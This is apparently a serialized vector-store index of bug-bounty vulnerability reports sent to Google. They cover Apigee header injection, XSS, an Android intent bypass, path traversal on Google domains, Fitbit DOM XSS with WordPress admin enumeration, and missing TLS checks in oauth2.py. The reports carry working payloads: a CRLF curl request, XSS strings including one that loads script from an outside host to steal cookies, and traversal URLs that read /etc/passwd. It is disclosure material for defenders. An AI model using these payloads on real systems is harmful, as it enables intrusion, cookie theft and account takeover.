"last_modified_date": "2025-04-22"}, "hash": "df9712198ae884d3e1793b46fca56ffbf4c0220ac75cf03c5e17ac5dc3e5c618", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nHeader Injection vulnerability in Google Apigee allows remote attacker to inject arbitrary headers or pollute request body when calling a target system under some circumstances\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Google Security team,\r\nThere are few ways in Apigee to add/set custom headers.\r\n1) By using\r\nAssignMessage\r\npolicy\r\nCase 1 - Add header via AssignMessage policy\r\n<AssignMessage name=\"AM-add-headers-1\">\r\n<Add>\r\n<Headers>\r\n<Header name=\"partner-id\">{verifyapikey.VAK-1.developer.app.partner-id}</Header>\r\n</Headers>\r\n</Add>\r\n<AssignTo>request</AssignTo>\r\n</AssignMessage>\r\nCase 2 - Set header via AssignMessage policy\r\n<AssignMessage name=\"AM-Set-Header\">\r\n<Set>\r\n<Header name=\"authenticated-developer\">{verifyapikey.VAK-1.developer.id}</Header>\r\n</Set>\r\n2) By manipulating\r\n[request|response|message].header.*\r\nflow variables\r\nCase 3 - Add header by manipulating flow variable via JavaScript policy\r\ncontext.setVariable(\"request.header.customHeader\", variable);\r\nCase 4 - Set header by position by manipulating flow variable via JavaScript policy\r\ncontext.setVariable(\"request.header.customHeader.1\", variable);\r\nIn the cases 1, 2 and 3 Apigee sanitizes headers values by removing all newline (\\n) characters.\r\nHowever, this does not happen in case 4, which allows malicious user to inject new header or body in request to target/callout system.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can circumvent business logic.\r\nThe attacker can add unexpected headers in request to target/callout system.\r\nThe attacker can override body of the request to target/callout system.\r\nAn Apigee proxy must use user input as header value (e.g. by moving it from body or query to headers)\r\nPlease find a PoC proxy (header-injection_rev2_2023_06_03.zip ) attached.\r\nSteps to reproduce:\r\nDownload PoC proxy from the attachments.\r\nCreate new proxy in Apigee UI by importing PoC proxy.\r\nReplace\r\n<APIGEE_HOST>\r\nin the following cURL snippet with ip/domain of your Apigee instance and send it.\r\ncurl -X POST \\\r\n'https://<APIGEE_HOST>/header-injection' \\\r\n--header 'Host: <APIGEE_HOST>' \\\r\n--header 'Content-Type: application/x-www-form-urlencoded' \\\r\n--data-raw 'variable=Value%0D%0AInjectedHeader%3A%20InjectedValue'\r\nObserve, that\r\nhttpbin\r\nresponded with Injectedheader: InjectedValue in headers section.\r\nP.S. If you are more comfortable with Burp Collaborator, you can use collaborator URL as target system to get raw request. Just go to Develop tab in Proxy editor, click on\r\ndefault\r\ntarget endpoint and replace the value of\r\n<URL>\r\ntag with your collaborator URL.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2642, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cceb856d-bce1-4fc5-8dee-c4e5a31700a9": {"__data__": {"id_": "cceb856d-bce1-4fc5-8dee-c4e5a31700a9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.clean.txt", "file_name": "20250408_175652_094133.clean.txt", "file_type": "text/plain", "file_size": 684, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3927bc7d-87d4-4023-a0c7-39c2f6879269", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.clean.txt", "file_name": "20250408_175652_094133.clean.txt", "file_type": "text/plain", "file_size": 684, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c3e6609ac707cabe71c5138f2a5c7d5b7cc8c19d259b4d098ee360540b2bbf39", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nBug XSS\r\nProduct:\r\nURL:\r\nhttps://granularinsurance.com/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHi Google Team, have a good day.\r\nI've found an XSS bug in one of the service domains in scope for this program.\r\nAttack scenario\r\nIn this main domain I tested, I found the input parameter\r\n?s=\r\nwhich is very vulnerable to XSS attacks, anyone can do an attack on the input parameter\r\n. I found this to be in scope for the bughunter program.\r\nAttackers can enter malicious code such as:\r\ntest\"><%0ascript>warning(document.domain)<%0a/script>\r\n.\r\nHere's a complete example:\r\nhttps://granularinsurance.com/?s=test\"><%0ascript>warning(document.domain)<%0a/script>", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 684, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9129da86-42ae-4ae0-ada0-bf39575bef63": {"__data__": {"id_": "9129da86-42ae-4ae0-ada0-bf39575bef63", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.clean.txt", "file_name": "20250408_175642_755233.clean.txt", "file_type": "text/plain", "file_size": 1046, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "de4c336d-9b37-40b4-af34-1c08a233d1d1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.clean.txt", "file_name": "20250408_175642_755233.clean.txt", "file_type": "text/plain", "file_size": 1046, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a5638171f17932a0f588dd920ee87c9db3f6c8a32112e28db365fa0cc1a1314d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nBypass to issue 40060327 via market:// URL\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nmarket://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nThis is a chromium security issue tracked as\r\nhttps://issues.chromium.org/338398037\r\nThey asked me to file a bug here, its very similar to the fixed\r\nhttps://issues.chromium.org/40064598\r\nI recommend adding [REDACTED_EMAIL] for context.\r\nInstall Samsung browser\r\nPut the following html on a Android device\r\n<a href=\"market://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org\">tap</a>\r\nTap that link\r\nNotice it opened the Samsung browser via chrome to an attacker chosen URL without prompting the user first bypassing the protections of\r\nhttps://issues.chromium.org/40060327\r\nAttack scenario\r\nGoogle Play bypasses the patch from\r\nas\r\nThis intent URI causes the link to be opened in the Samsung browser (com.sec.android.app.sbrowser) application instead. This occurs without any notification to or consent from the user.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1046, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "05f5807d-ff00-484b-b925-cece49344685": {"__data__": {"id_": "05f5807d-ff00-484b-b925-cece49344685", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.clean.txt", "file_name": "20250408_175644_985957.clean.txt", "file_type": "text/plain", "file_size": 558, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "21b4d607-1331-4c4a-a6c8-60eb19a0f1d9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.clean.txt", "file_name": "20250408_175644_985957.clean.txt", "file_type": "text/plain", "file_size": 558, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ad5db19204b3260a4ef153350ca50db454a24d4db0aecf7dda57839f6af2ee0b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nLFI in knowyourdata-tfds.withgoogle.com\r\nProduct:\r\nknowyourdata-tfds.withgoogle.com\r\nURL:\r\nhttps://knowyourdata-tfds.withgoogle.com/assets/onboarding/\r\nVulnerability type:\r\nFile Inclusion\r\nDetails\r\nPOC:-\r\nhttps://knowyourdata-tfds.withgoogle.com/assets/onboarding//..%2f..%2f..%2f..%2f..%2f..%2f__init__.py\r\nAttack scenario\r\nAn attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 558, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ea5517a3-2839-4053-a1b2-cce94dc175cc": {"__data__": {"id_": "ea5517a3-2839-4053-a1b2-cce94dc175cc", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.clean.txt", "file_name": "20250408_175733_469365.clean.txt", "file_type": "text/plain", "file_size": 2615, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2712ca84-2eb2-4adf-8f38-f57461b60dfb", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.clean.txt", "file_name": "20250408_175733_469365.clean.txt", "file_type": "text/plain", "file_size": 2615, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "3c85293b9ec5a7ca65a04a37ea828b0cdfffa5df6c1e6440b29650dd9605c54a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Local File Inclusion 'LFI' Vulnerability\r\nHi Google!\r\nI found an Local File Inclusion 'LFI' Vulnerability in \"Google's Edge Network\".\r\nSteps to reproduce:\r\nGo to \"\r\nhttps://peering.google.com/\"\r\n.\r\nOpen any picture in another window for example: \"\r\nhttps://peering.google.com/static/images/couch-ipad.png\"\r\nAdd one of this value at the end of the link: (\"../../../../../../../etc/passwd\") OR (\"../../../../../../../proc/self/cmdline\") OR (\"../../../../../../../proc/self/stat\") OR\r\n(\"../../../../../../../proc/self/status\").\r\nIn this way: \"\r\nhttps://peering.google.com/static/images/couch-ipad.png../../../../../../../proc/self/cmdline\"\r\nNow you are viewing sensitive information about the server.\r\nPoC Video: \"\r\nhttps://www.youtube.com/watch?v=4QNSqiG53oU\"\r\nBrowser/OS: Firefox/Chrome (windows 10).\r\nAttack scenario:\r\nImpacts of an Exploited Local File Inclusion Vulnerability\r\nAs it is known, the impacts of exploiting a Local File Inclusion (LFI) vulnerability vary from information disclosure to complete compromise of the system. Even in cases where the included code is not executed, it can still give an attacker enough valuable information to be able to compromise the system,As is the case of the security vulnerability we are reporting\r\nThe attacker gets information about the server and Kernel data. # (PoC: \"/proc/version\" OR \"/proc/cpuinfo\" OR \"proc/meminfo\")\r\nExample leak data: \"Linux version 3.11.10 #1 SMP\"\r\nThe attacker gets information about the files on the server. # (PoC:\"proc/self/cmdline\")\r\nExample leak data: \"server_software=Google App Engine/1.9.69\"\r\nThe attacker gets information about the internal network. # (PoC:\"proc/self/cmdline\")\r\nExample leak data:\"apihost_address=169.254.169.253:4 /server_address=169.254.8.2:5\"\r\nThe attacker gets information about the operations and the time they run on the server. # (PoC:  \"proc/self/stat\")\r\nExample leak data: \"(python27g_runti)\"\r\nThe attacker gets sensitive information about the operation processes and the ability of the system that can contribute well in measuring the size of denial of service attacks. # (PoC: \"proc/self/status\").\r\nExample leak data: \"FDSize: 11,  VmSize: 1134532 kB,  VmRSS: 134860 kB, Threads: 17\"\r\nThe attacker gets statistics about the system and its files. # (PoC: \"/proc/self/io\").\r\nExample leak data: \"char: 3696441 wchar: 6431 syscr: 901 syscw: 53\"\r\nAs you know a lot of commands that can be implemented and reviewed by attackers as long as the web server receives these requests and responds to them there will be more data leaks, and this poses a threat to the server.\r\nBest Regards\r\nJafar Abu Nada", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2615, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a87ebdfc-3bfb-425c-a34a-d7c27039c591": {"__data__": {"id_": "a87ebdfc-3bfb-425c-a34a-d7c27039c591", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f5c54eea-a0eb-44bc-8b52-48d3e9f00a1b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5df6f37e48d4f1b29f41a9ca3a75a4f361a4fbd6e922b9b581d13cb4f8586b3f", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "d6cf4491-403f-4869-bce1-beb2987b098d", "node_type": "1", "metadata": {}, "hash": "013157d93b4b4cc187bcdb5794b2923f9c5c427919d8fa69d3c29024f0057ca3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nAccount takeover via DOM XSS with user interaction\r\nProduct:\r\nFitbit\r\nURL:\r\nhttps://healthsolutions.fitbit.com/news/\r\nVulnerability type:\r\nunknown\r\nDetails\r\nThe site\r\nhas a search feature. When we search something on this site it does not load the results from server, but passes the search term to\r\ndangerous DOM Sinks\r\nsuch as\r\njQuery.after() and element.innerHTML\r\nand renders the result. This makes the site vulnerable to cross site scripting which can be used to steal cookies using document.cookie or deface the site using iframe tags.\r\nA simple payload such as\r\n<script>alert(document.cookie)</script>\r\nor one with my server such as\r\n<script src=https://tzh.xss.ht></script>\r\nis enough to steal the cookies of the victim and cause account takeover since the\r\ncookies are same as that of\r\nmain domain\r\nwith additional cookies specific to wordpress\r\nWhile performing this attack I've noticed that both jQuery.after() and element.innerHTML acts as sinks but portswigger\r\nsays\r\nelement.innerHTML does not accept tags like script, svg on any modern browser . So I think the main problem here is jQuery.after() which allows simple scripts such as\r\nto be executed.\r\nSince X-Frame-Options protection is there I couldn't turn this vulnerability into zero click account takeover using clickjacking and url parameters are not loaded into the script so no to reflected+DOM vulnerability as well. But there are still other\r\ntwo methods\r\nto cause account takeover via this vulnerability, I'll detail them below\r\nOne easy option to cause zero user interaction  account takeover using malicious extensions to pass the malicious script into search field. This could result in zero click account takeover.\r\nAnother method requires user interaction like luring the victim user into pasting the payload into search field. In real world scenario this method is easier to do. Since vulnerability programs don't allow performing such kind of exploitation I'm just reporting this as possible attack scenario.\r\nSince this is a\r\nWordpress based\r\nwebsite this also allows\r\nWordpress Admin account takeover\r\n. I'm detailing it below:\r\nWordpress's metadata endpoint\r\nhttps://healthsolutions.fitbit.com/wp-json/wp/v2/users\r\ndiscloses admin usernames via\r\nslug\r\nattribute. I enumerated usernames and emails by incrementally going through all /users/[1-80] endpoints\r\nSome users' \"slug\" attribute had hyphens but I was able to convert them into valid\r\nusernames or Emails\r\nby replacing hyphens with either a dot or an @\r\nOne can easily find out whether these enumerated usernames/emails are valid by the error message shown when entering a random password with these username/emails in\r\nhttps://healthsolutions.fitbit.com/wp-admin\r\n. The list of usernames and emails I enumerated using this technique are given below:\r\nUsernames\r\n[REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME]\r\nEmails\r\n[REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@gmail.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com\r\nNow it's easy to send a targeted phishing mail to these emails which have elevated privilege and if successful this could lead into wp-admin access as well.\r\nI searched the enumerated wp-admin mails on haveibeenpwned.com and found the following emails to be pwned in previous data breaches.\r\n[REDACTED_USERNAME]@gmail.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com,\r\nBreached emails are the regular target of hackers who do attacks like credential stuffing\r\nEven without these emails one can target normal fitbit users as the cookies are same for main domain.\r\nAttack scenario\r\nHackers who do phishing can easily lure people into believing they are doing something totally normal since it's just a search field.\r\nAny novice hacker can exploit this vulnerability since the attack scenario is very simple.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4272, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d6cf4491-403f-4869-bce1-beb2987b098d": {"__data__": {"id_": "d6cf4491-403f-4869-bce1-beb2987b098d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f5c54eea-a0eb-44bc-8b52-48d3e9f00a1b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5df6f37e48d4f1b29f41a9ca3a75a4f361a4fbd6e922b9b581d13cb4f8586b3f", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "a87ebdfc-3bfb-425c-a34a-d7c27039c591", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d241afa0543fc6813f9e5d81cf632b5f87bef0c88c9801178a9cafce6ef13ce6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "I searched the enumerated wp-admin mails on haveibeenpwned.com and found the following emails to be pwned in previous data breaches.\r\n[REDACTED_USERNAME]@gmail.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com,\r\nBreached emails are the regular target of hackers who do attacks like credential stuffing\r\nEven without these emails one can target normal fitbit users as the cookies are same for main domain.\r\nAttack scenario\r\nHackers who do phishing can easily lure people into believing they are doing something totally normal since it's just a search field.\r\nAny novice hacker can exploit this vulnerability since the attack scenario is very simple. Just input a malicious script into search field\r\nThey can cause account takeover of both normal fibit users and admin users of this wordpress page", "mimetype": "text/plain", "start_char_idx": 3510, "end_char_idx": 4419, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "814b0675-be6e-49b3-a9eb-3f211272f2f6": {"__data__": {"id_": "814b0675-be6e-49b3-a9eb-3f211272f2f6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "35af454d-9818-4eb3-8905-54007222c87c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8c625b164663e54c4ae963851d8d73f52b63c37d31f5e63c4a091b4c5792a3df", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "c4e46788-f358-428b-88a6-821e43f5a3d9", "node_type": "1", "metadata": {}, "hash": "6e7114ba8ca6f7c093521acb89455829300fe15055656ef2a7cbac83c4cd413b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nInsecure defaults in Python libraries are not handled by Oauth2 Python client\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/google/gmail-oauth2-tools/blob/master/python/oauth2.py\r\nVulnerability type:\r\nunknown\r\nDetails\r\nDear Security team,\r\nI am currently writing a blog post on insecure defaults and regarding this topic, I stumbled upon your open-source script oauth2.py. The code uses a Python library in a way, which does not implement proper certificate checking. I found the vulnerable part here:\r\nThe vulnerable code part is:\r\ndef TestImapAuthentication(user, auth_string):\r\n[...]\r\nimap_conn = imaplib.IMAP4_SSL('imap.gmail.com')\r\nimap_conn.debug = 4\r\nimap_conn.authenticate('XOAUTH2', lambda x: auth_string)\r\ndef TestSmtpAuthentication(user, auth_string):\r\nsmtp_conn = smtplib.SMTP('smtp.gmail.com', 587)\r\nsmtp_conn.set_debuglevel(True)\r\nsmtp_conn.ehlo('test')\r\nsmtp_conn.starttls()\r\nsmtp_conn.docmd('AUTH', 'XOAUTH2 ' + base64.b64encode(auth_string))\r\nBoth functions are used to check if the authentication was successful. These functions implement the check by connecting the Google IMAP respectively the SMTP server.\r\nThe Python library is used in a vulnerable way. The script is for Python2. Python 3.3 added a SSL context parameter to be able to set a SSL Context. If no proper SSL context is passed to the constructor of imaplib.IMAP4_SSL and smtp_conn.starttls() in Python 3 (or set via other means), there is no certificate checking. With Python2 the underlying problem is the same.\r\nAs a result, the Python library does not check a server's X.509 certificate, which could result in the disclosure of mail server credentials (here authentication tokens), when the client connects to an attacker in a MITM position.\r\nThis problem can be tested by adding an entry to /etc/hosts, for example\r\nanother-imap-server-ip-address      imap.gmail.com\r\nanother-smtp-server-ip-address      smtp.gmail.com\r\nWith another-xxxx-server-ip-address used from the smtp.outlook.com respectivly imap.outlook.com DNS result set.\r\nIf you then run the script, it does not result in a certificate error, but in an invalid authentication error. for example:\r\n$ python2 ./oauth2.py --user=[...]@googlemail.com --access_token=[...] --test_imap_authentication\r\n25:16.86 > BHID1 AUTHENTICATE XOAUTH2\r\n25:16.88 < BHID1 NO [ALERT] Authentication failed.\r\n25:16.88 NO response: [ALERT] Authentication failed.\r\nTraceback (most recent call last):\r\nFile \"./oauth2.py\", line 347, in <module>\r\nmain(sys.argv)\r\nFile \"./oauth2.py\", line 334, in main\r\nbase64_encode=False))\r\nFile \"./oauth2.py\", line 274, in TestImapAuthentication\r\nFile \"/usr/lib/python2.7/imaplib.py\", line 367, in authenticate\r\nraise self.error(dat[-1])\r\nimaplib.error: [ALERT] Authentication failed.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2777, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c4e46788-f358-428b-88a6-821e43f5a3d9": {"__data__": {"id_": "c4e46788-f358-428b-88a6-821e43f5a3d9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "35af454d-9818-4eb3-8905-54007222c87c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8c625b164663e54c4ae963851d8d73f52b63c37d31f5e63c4a091b4c5792a3df", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "814b0675-be6e-49b3-a9eb-3f211272f2f6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b9c495a740da9a646a853adafdf43e0c06eecc714451e85be937ca9b150f7e73", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "If you then run the script, it does not result in a certificate error, but in an invalid authentication error. for example:\r\n$ python2 ./oauth2.py --user=[...]@googlemail.com --access_token=[...] --test_imap_authentication\r\n25:16.86 > BHID1 AUTHENTICATE XOAUTH2\r\n25:16.88 < BHID1 NO [ALERT] Authentication failed.\r\n25:16.88 NO response: [ALERT] Authentication failed.\r\nTraceback (most recent call last):\r\nFile \"./oauth2.py\", line 347, in <module>\r\nmain(sys.argv)\r\nFile \"./oauth2.py\", line 334, in main\r\nbase64_encode=False))\r\nFile \"./oauth2.py\", line 274, in TestImapAuthentication\r\nFile \"/usr/lib/python2.7/imaplib.py\", line 367, in authenticate\r\nraise self.error(dat[-1])\r\nimaplib.error: [ALERT] Authentication failed.\r\nRespectively for the SMTP case:\r\n$ python2 ./oauth2.py --user=[...]@googlemail.com --access_token=[...] --test_smtp_authentication\r\nsend: 'ehlo test\\r\\n'\r\nreply: '250-BE1P281CA0291.outlook.office365.com Hello [91.5.245.138]\\r\\n'\r\nreply: '250-SIZE 157286400\\r\\n'\r\nreply: '250-PIPELINING\\r\\n'\r\nreply: '250-DSN\\r\\n'\r\nreply: '250-ENHANCEDSTATUSCODES\\r\\n'\r\nreply: '250-STARTTLS\\r\\n'\r\nreply: '250-8BITMIME\\r\\n'\r\nreply: '250-BINARYMIME\\r\\n'\r\nreply: '250-CHUNKING\\r\\n'\r\nreply: '250 SMTPUTF8\\r\\n'\r\nreply: retcode (250); Msg: BE1P281CA0291.outlook.office365.com Hello [91.5.245.138]\r\nSIZE 157286400\r\nPIPELINING\r\nDSN\r\nENHANCEDSTATUSCODES\r\nSTARTTLS\r\n8BITMIME\r\nBINARYMIME\r\nCHUNKING\r\nSMTPUTF8\r\nsend: 'STARTTLS\\r\\n'\r\nreply: '220 2.0.0 SMTP server ready\\r\\n'\r\nreply: retcode (220); Msg: 2.0.0 SMTP server ready\r\nsend: 'AUTH XOAUTH2 dXNlcj[...]=\\r\\n'\r\nreply: '503 5.5.2 Send hello first [BE1P281CA0291.DEUP281.PROD.OUTLOOK.COM 2023-07-16T14:34:55.386Z 08DB85D261AAB272]\\r\\n'\r\nreply: retcode (503); Msg: 5.5.2 Send hello first [BE1P281CA0291.DEUP281.PROD.OUTLOOK.COM 2023-07-16T14:34:55.386Z 08DB85D261AAB272]\r\nThe  oauth2.py is for example used here in the imapsync project:\r\nhttps://github.com/imapsync/imapsync/blob/master/oauth2/oauth2_google.py\r\nWhile certificate verification may have been a nice-to-have feature a decade ago, with Python3.3 but at least in 2023 it is a vulnerability to not have it.\r\nAttack scenario\r\nAn active attacker in MITM position may intercept authentication tokens for IMAP/SMTP.", "mimetype": "text/plain", "start_char_idx": 2057, "end_char_idx": 4272, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, 